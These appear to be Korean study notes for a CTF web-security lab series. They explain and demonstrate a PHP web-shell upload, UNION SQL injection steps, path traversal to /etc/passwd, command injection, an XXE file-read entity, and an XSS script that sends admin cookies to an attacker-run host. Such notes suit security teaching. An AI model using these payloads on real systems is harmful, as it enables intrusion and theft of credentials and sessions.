# CTF

25-4 CTF 개념 정리 - 웹

## 웹

### 1번 문제

**HTTP Response Header 찾는 법**

1) Chrome DevTools 이용

-웹 페이지를 열고 F12 키를 누르거나 Ctrl+Shift+I (Windows/Linux) 또는 Cmd+Option+I (Mac) 키를 눌러 개발자 도구를 엽니다.

-"Network" 탭을 선택합니다.

-페이지를 새로고침(F5)하거나 요청을 트리거한 후, 네트워크 요청이 리스트에 나타납니다.

-요청 항목을 클릭하면 응답 헤더와 함께 요청 헤더, 본문 등을 확인할 수 있습니다.

2) Curl 명령어 사용

터미널이나 커맨드 라인에서 curl 명령어를 사용하여 HTTP 응답 헤더를 확인할 수 있다.

```sh
curl -I https://example.com
```
-I 옵션은 헤더만 출력하게 해줍니다. 예를 들어, https://example.com에 대한 HTTP 응답 헤더가 출력됩니다.

***

### 2번 문제

**웹 서버의 권한 변조 취약점이란?**

사용자가 본인에게 허용되지 않은 리소스나 기능에 접근할 수 있도록 만드는 취약점을 말한다.

이는 주로 인증된 사용자만 접근할 수 있어야 할 자원이나 페이지에 대한 접근 제어가 제대로 구현되지 않았을 때 발생한다.

**권한 변조 취약점의 예시:**

**1) URL 경로를 통한 우회**

웹 애플리케이션이 사용자 권한을 URL 경로에 의존해서 결정하는 경우, 사용자는 URL 경로를 조작하여 본인이 접근할 수 없는 자원에 접근할 수 있다.

예를 들어, 다음과 같은 URL을 사용하여 특정 사용자의 대시보드에 접근하려고 한다면
```
https://example.com/user_dashboard?id=1234
```
공격자가 id 값을 변경하여 다른 사용자의 대시보드에 접근할 수 있다.
```
https://example.com/user_dashboard?id=5678
```

**2) HTTP 헤더나 파라미터를 통한 권한 상승**

서버에서 사용자의 권한을 특정 HTTP 헤더나 파라미터 값으로 체크할 때, 공격자는 이러한 값을 변조하여 관리자 권한을 획득하거나, 다른 사용자의 권한을 얻을 수 있다.

예를 들어, 웹 애플리케이션이 사용자의 역할을 role 파라미터로 판단하는 경우
```
https://example.com/profile?role=admin
```
공격자가 이 값을 admin으로 변경하고 서버가 이를 신뢰하게 되면, 일반 사용자 계정이 관리자 권한을 가질 수 있다.

**3) 세션 관리 취약점**

웹 애플리케이션에서 세션 관리를 제대로 하지 않거나, 세션 토큰을 안전하게 저장하지 않으면, 공격자가 세션 토큰을 탈취하거나 변조하여 다른 사용자의 권한으로 시스템에 접근할 수 있다.

예를 들어, 세션 ID가 URL에 노출되어 있다면 공격자는 이를 훔쳐서 다른 사용자의 세션에 접근할 수 있다.

**4) 파일 및 디렉토리 경로 조작**

웹 애플리케이션에서 사용자가 접근할 수 있는 파일이나 디렉토리 경로를 제어할 때, 이를 적절하게 필터링하지 않으면 공격자가 경로를 조작해 제한된 파일에 접근할 수 있다.

예를 들어, URL 경로로 사용자가 다운로드할 파일을 지정하는 경우, 공격자는 경로를 변조하여 다른 사용자의 파일에 접근할 수 있다.

```
https://example.com/download?file=reports/secret_report.pdf
```
공격자는 경로를 수정하여 다른 디렉토리의 파일에 접근할 수 있다.
```
https://example.com/download?file=../../etc/passwd
```

**Burp Suite Proxy, Repeater 사용법**

Burp Suite: 웹 모의해킹 및 보안 테스트에 널리 사용되는 도구

프록시(proxy): 웹 브라우저, 웹 서버 사이의 트래픽을 중간에 가로채서 분석할 수 있게 해주는 기능.

리피터(repeater): 캡처한(가로챈) http 요청을 자유롭게 수정하고, 여러 번 반복 전송할 수 있는 기능.

인트루더(intruder): Brute Force 공격 등을 진행할 때, 공격을 자동화하는데 도움을 주는 도구

**1. Burp Suite의 Proxy 설정**

Burp Suite의 Proxy는 클라이언트(예: 웹 브라우저)와 서버 사이에서 HTTP(S) 요청을 가로채고 수정할 수 있게 해줍니다. 이를 통해 웹 애플리케이션의 동작을 분석하고 취약점을 테스트할 수 있습니다.

**Proxy 설정 단계**

**1) Burp Suite 실행 및 프록시 활성화**

- Burp Suite를 실행합니다.

- Proxy 탭을 클릭한 뒤 Intercept 탭을 선택합니다.

- Intercept is on 상태에서 Burp Suite는 클라이언트와 서버 간의 HTTP 요청과 응답을 가로챕니다.

**2) 브라우저에서 프록시 설정**

- Burp Suite가 요청을 가로챌 수 있도록 웹 브라우저의 프록시 설정을 변경해야 합니다.

- 기본적으로 Burp Suite는 localhost:8080에서 실행됩니다. 이를 웹 브라우저에서 설정해야 합니다.

**3-1) Chrome에서 설정하는 방법**

- 브라우저에서 Settings > Advanced > System > Open proxy settings로 이동합니다.

- Manual proxy configuration에서 HTTP Proxy를 localhost로, Port를 8080으로 설정합니다.

**3-2) Firefox에서 설정하는 방법**

- Firefox에서 Preferences > Network Settings > Manual proxy configuration을 선택합니다.

- HTTP Proxy와 Port를 localhost:8080으로 설정합니다.

**4) SSL 인증서 설치 (HTTPS 사용 시)**

- Burp Suite가 HTTPS 트래픽을 가로챌 수 있도록, Burp Suite의 SSL 인증서를 브라우저에 설치해야 합니다.

- Burp Suite에서 Proxy > Options > Import / export CA certificate에서 SSL 인증서를 내보내고, 이를 브라우저에 설치합니다.

- http://burpsuite에 접속하여 인증서를 다운로드하고 설치합니다.

**5) 가로채기 시작**

- 브라우저에서 웹사이트를 접속하면, Burp Suite의 Intercept 탭에서 요청과 응답을 볼 수 있습니다.

- 요청이 자동으로 가로채지면, Intercept is on이 활성화되어 있습니다. 이때 요청을 수정하거나, 응답을 변경할 수 있습니다.

**2. Burp Suite의 Repeater 사용법**

Repeater는 수정된 요청을 서버로 반복적으로 전송하여 응답을 분석하는 도구입니다. Proxy를 통해 가로챈 요청을 Repeater로 보내고, 요청을 수정한 뒤 서버에 반복해서 요청을 보내는 방식입니다. 이를 통해 취약점을 테스트하거나 응답을 분석하는 데 사용됩니다.

**Repeater 사용 단계**

**1) 요청을 Repeater로 보내기**

- Burp Suite의 Proxy 탭에서 가로챈 요청을 선택합니다.

- 요청을 Repeater로 보냅니다. 이를 위해 요청을 우클릭하고, "Send to Repeater" 옵션을 선택합니다.

- 또는, Request를 선택하고 Ctrl+R (Windows/Linux) 또는 Cmd+R (Mac)을 눌러 Repeater로 보낼 수 있습니다.

**2) Repeater에서 요청 수정**

- Repeater 탭을 클릭하면, 보낸 요청이 표시됩니다.

- 요청의 헤더나 파라미터, 본문 등을 수정할 수 있습니다.

- 예를 들어, 로그인 요청에서 username이나 password 값을 수정하여 다른 사용자로 로그인 시도를 하거나, URL 파라미터를 수정할 수 있습니다.

**3) 수정된 요청 보내기**

- 수정한 요청을 서버에 보내려면, "Send" 버튼을 클릭합니다.

- 서버로부터 응답을 받으면, Response 섹션에 해당 응답이 나타납니다. 응답을 분석하여 취약점이나 예상 외의 동작을 확인할 수 있습니다.

**4) 요청 반복하기**

- Send 버튼을 반복적으로 눌러 요청을 계속해서 보낼 수 있습니다.

- 요청을 여러 번 보내면서 응답의 차이점을 비교할 수 있습니다. 예를 들어, 사용자의 권한을 변경하는 요청을 보내고, 서버의 응답을 분석하여 권한 상승이 가능한지 확인할 수 있습니다.

**5) 응답 분석**

- 서버로부터 받은 응답을 분석하여, 예상한 결과와 다를 경우 취약점이 있을 수 있다는 것을 확인합니다.

- 응답 코드, 본문 내용, 헤더 등을 확인하여 웹 애플리케이션의 동작을 파악합니다.

***

### 3번 문제

**웹 쉘(Web Shell)이란?**

웹에서 동작하는 쉘(Shell)

- 해커가 웹 서버의 취약점을 이용해 서버에 업로드하는 악성 스크립트 파일
- php, jsp, asp ~
- 웹 쉘이 올라가게 되면, 웹 브라우저만으로도 서버에 임의의 명령을 실행시킬 수 있다.
- 파일 삭제, 페이지 변조, 추가 백도어(악성코드) 설치 등의 공격
- 공격자가 웹 쉘에 접근가능할 때, 공격이 가능(RCE)

**리눅스 명령어**
ls: 디렉토리의 파일 list 출력 (ls -al)
ls .. : 한 단계 위 디렉토리 파일 출력 (ls ../.. : 두 단계 위)
cd : 디렉토리 변경 (cd ..   cd ../..   cd /var/log 등)
pwd : 현재 디렉토리 위치 출력 (print working directory)
cat : 실행 명령어 (cat 경로/파일명   ex) cat /var/log/access.log)
find : 찾기 명령어 (  ex) find / -name flag.php   )
  
**원격 코드 실행(RCE)이란?**

원격 코드 실행 (Remote Code Execution, RCE) 이란, 공격자가 외부에서 서버에 악성 코드를 보내 실행시키는 공격 기법이다.

즉, 공격자가 웹 서버나 애플리케이션에 접근해서 의도하지 않은 임의의 명령어 또는 스크립트를 원격에서 실행할 수 있다는 뜻이다.
<br>
<br>
문제에서는 웹 사이트의 파일을 업로드할 수 있는 기능을 통해
```php
<?php system($_GET['cmd']); ?>
```
위와 같은 PHP 코드를 넣은 파일을 업로드 하게 되면, 위 문제에서는 파일을 업로드한 위치가 뜨게 되는데(공격자가 웹 쉘에 접근 가능),
```
http://[웹 서버 주소]/[PHP 웹 쉘 경로]?cmd=[명령어]
```
다음과 같은 URL 형식으로 변조하여 전송하면, [명령어] 부분에서 실행한 리눅스 서버 명령어가 그대로 실행된다.

***

### 4번 문제

3번 문제의 연장선으로, 이번에는 확장자 필터링을 통해 .php 파일 업로드는 금지되었다.

**시도해 볼 것**

다른 확장자를 사용해보기(php5, php7, php4, phtml, phar)

***

### 5번 문제

**UNION SQL Injection에서 기본 개념**

Union 연산자: U

- 결합되는 두 SELECT 문의 COLUMN(속성) 값이 동일해야함.

- 컬럼 수가 동일하지 않으면 DB는 오류를 반환

Union SQL Injection : 두 개의 SQL 문을 결합해서 만드는 SQL 공격

- 보통 정상질의 뒤에 다른 악성질의를 결합해서 SQL 문을 주입

<br>
<br>

**1. 컬럼 수 확인 : 1, 2, 3, 4, #**

' UNION SELECT 1, 2, 3, 4 ; #

<br>

**2. DB 데이터베이스의 이름을 찾기 - DB 명: board**

' UNION SELECT 1, 2, schema_name, 4 FROM information_schema.schemata ; #

자리는 상관이 없음.

왜 schema_name인가? => 그것이 실제 DB 이름을 담고 있는 정확한 컬럼명이기 때문

왜 information_schema.schemata인가? => MySQL에서 DB 목록을 담고 있는 시스템 테이블이기 때문 (schemata는 "스키마들"이라는 뜻)

<br>

**3. Table 명 찾기 - Table 명 : users**

' UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_schema = 'board' ; # (WHERE 절 DB에 있는 TABLE 질의 검색)

왜 information_schema.tables인가?
 
MySQL에서는 모든 데이터베이스의 테이블 목록을 이 시스템 테이블에 저장합니다.

information_schema.tables는 표준 시스템 테이블

```
주요 컬럼:

table_schema: 테이블이 속한 데이터베이스 이름
table_name: 테이블 이름
table_type: BASE TABLE, VIEW 등
```
<br>

**4. 속성 명 찾기 - 속성명 : id, email, password, flag**

' UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name = 'users' ; #

information_schema.columns란?

MySQL 시스템 테이블로, 모든 테이블의 컬럼 정보를 저장하고 있다.

```
주요 컬럼:
table_schema: 어떤 DB 소속인지
table_name: 어떤 테이블인지
column_name: 컬럼 이름
```
WHERE 조건: table_name = 'users'

이 조건으로 인해 "users"라는 이름을 가진 테이블의 컬럼들만 가져온 것.

단, users라는 테이블 이름은 모든 데이터베이스에 걸쳐 조회되기 때문에,  만약 같은 이름의 테이블이 다른 DB에 또 있다면, 구분이 필요할 수도 있다.

<br>

**5. SQL 문: SELECT column명 FROM Table명**

' UNION SELECT 1, 2, flag, 4 FROM users ; #

=> 결과가 화면에 바로 출력됨

정리하자면,
```
UNION SQL Injection 5단계 과정
1. 취약점 위치 파악하기
입력값이 SQL 쿼리에 그대로 들어가는지 확인
예) ' OR '1'='1 같은 간단한 페이로드로 반응 확인

2. 컬럼(column) 수 파악하기
ORDER BY나 UNION SELECT로 컬럼 개수를 맞춰야 함
예) ' ORDER BY 3 -- (오류 없으면 3개 컬럼 존재)
또는 ' UNION SELECT 1,2,3 -- 으로 성공하는 컬럼 개수 찾기

3. 출력 가능한 컬럼 위치 확인하기
UNION SELECT에 숫자 대신 문자열 넣어 어떤 컬럼이 웹에 출력되는지 찾기
예) ' UNION SELECT 'a', 'b', 'c' -- 로 a,b,c 중 어느 값이 노출되는지 확인

4. DB 구조 정보 수집하기
information_schema에서 DB 이름, 테이블 이름, 컬럼 이름을 쿼리해 확인
예) DB 이름: ' UNION SELECT 1, 2, schema_name, 4 FROM information_schema.schemata --
테이블 이름: ' UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_schema='board' --
컬럼 이름: ' UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='users' --

5. 민감 데이터 추출하기
실제 테이블과 컬럼을 이용해 데이터 조회
예) ' UNION SELECT id, email, password, flag FROM users --
원하는 데이터를 웹페이지에 노출시킴
```

***

### 6번 문제

**File Download**

```php
$filename = str_replace("./", " ", $filename);
```
$filename 문자열에서 "./" (점+슬래시)를 " " (공백)으로 치환하는 코드이다.

***

### 7번 문제

kali 리눅스 기본 계정: kali / kali

**힌트**
1) Tomcat manager default Credentials

관리자 기본 계정: Tomcat / Tomcat

2) Tomcat Deploy

***

### 8번 문제

**BLIND SQL Injection이란?**

- 데이터베이스의 결과 데이터가 직접 노출되지 않는 상황에서 서버의 참/거짓 반응을 기반으로 정보를 추출하는 SQL Injection

- 직접적인 데이터 노출 없이도, 정보를 유출할 수 있는 취약점

- 스무고개 / 맞다 or 틀리다

**%의 의미**

-abc% : abc로 시작하는 모든 문자열을 포함한다.

  ex) abc, abc123, abcde, abcXYZ
  
  cf) abc = abc 일때만 참

***

### 9번 문제

1) .htaccess : 아파치 웹서버의 해당 디렉터리 설정을 제어하는 파일

파일이 실행되기 전, 먼저 동일한 경로에 존재하는 .htaccess 파일의 설정을 먼저 적용 받음

파일을 해당 확장자(php)로 인식되게 설정
```sh
AddType application/x-httpd-php .txt .abc. xyz
```

2) 파일 업로드 1, 2번 문제와 동일하게 flag 찾기

```php
<?php system($_GET["cmd"]); ?>
```

***

### 10번 문제

**Command Injection이란?**

웹 어플리케이션 등에서 사용자의 입력값이, 운영체제의 명령어를 실행하는 함수로 전달될 때 발생하는 취약점

- 입력값 검증 없이 전달될 때 발생 * System(), exec() 같은 입력값
- 공격자는 이 취약점을 이용해 임의의 시스템 명령어를 삽입, 실행하거나, 민감 정보 유출로 이어질 수 있음.

```sh
ls ; cat /var/log
```

EX) 입력값 8.8.8.8 ; cat /etc/passwd 라던지 ;을 이용해 추가 명령어를 삽입하는 공격

***

### 11번 문제

**디렉토리 리스팅 취약점이란?**

- 웹 서버의 설정이 미흡하여 특정 디렉토리에 대한 파일과 폴더 목록이 외부에 그대로 노출되는 취약점
- Burp Suite 혹은 F12(관리자 도구) 이용
- jpg 사진 파일이 웹 서버의 어떤 디렉토리에서 출력되는지 경로 찾아보기

***

### 12번 문제

**XXE 취약점이란?**

- 외부 엔티티 취약점: 웹 어플리케이션이 XML 데이터를 처리할 때 발생하는 취약점으로 외부 엔티티 참조를 허용할 경우 발생 가능.
- XML 파서가 외부 엔티티 선언을 허용할 때 악용됨.
- Burp Suite 이용
- php wrapper 중, file://: 서버 내부 파일을 읽는 wrapper

```xml
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
```
**XXE Payload 삽입**

요청의 맨 위에 DOCTYPE 선언을 추가하고, 외부 엔티티를 이용해서 파일을 읽도록 구성.

&xxe;는 <!ENTITY>로 선언된 외부 엔티티를 참조함.

이 예제는 /etc/passwd를 읽지만, 실제 flag가 있을 위치로 경로를 바꿔야 함.

***

### 13번 문제

**크로스 사이트 스크립트 취약점이란?**

- 담당자에게 메일을 보내는 웹 페이지 : 요청사항에 악성 스크립트를 삽입하여, 관리자가 해당 요청을 읽는 순간 관리자 쿠키 값이 넘어옴 (reflected XSS)
- 칼리 리눅스 이용 필요 (윈도우 접속 옆 리눅스 접속)
* 칼리 리눅스는 관리자의 쿠키값을 탈취하기 위해 모니터링 기능을 위해 사용
- 리눅스 터미널 열기 (로그 모니터링 스크립트)
* 칼리 리눅스 ip 확인 명령어 : ifconfig

```sh
1. cd /var/log
2. service apache2 start (리눅스 로그인 비밀번호: kali)
3. sudo tail -f ./apache2/access.log
```

```javascript
<script>location.href='http://리눅스 ip 주소(도메인)/?'+document.cookie;</script>
```
위와 같은 스크립트를 Message 칸에 입력하면 리눅스에서 쿠키값이 탈취된다.

***

### 14번 문제

**LFI(Local File Inclusion)이란?**

- 웹 애플리케이션이 사용자로부터 입력받은 값을 통해 서버의 파일을 읽도록 설계된 경우, 공격자가 임의의 로컬 파일을 포함시킬 수 있는 취약점]
- 즉, 웹 서버 내부의 중요한 파일들을 노출시키거나, 경우에 따라 원격 코드 실행(RCE)으로 이어질 수도 있음.

**PHP Wrapper**

- Wrapper는 스트림(stream) 기능의 일부로, 파일 시스템 접근, 네트워크, 압축 파일 등 다양한 자원에 접근할 수 있게 해 주는 특수한 프로토콜
- file://, php://, data://, zip:// 같은 스트림 래퍼(wrappers)를 통해 일반 파일처럼 다양한 자원을 읽고 쓸 수 있음.

***

<br>
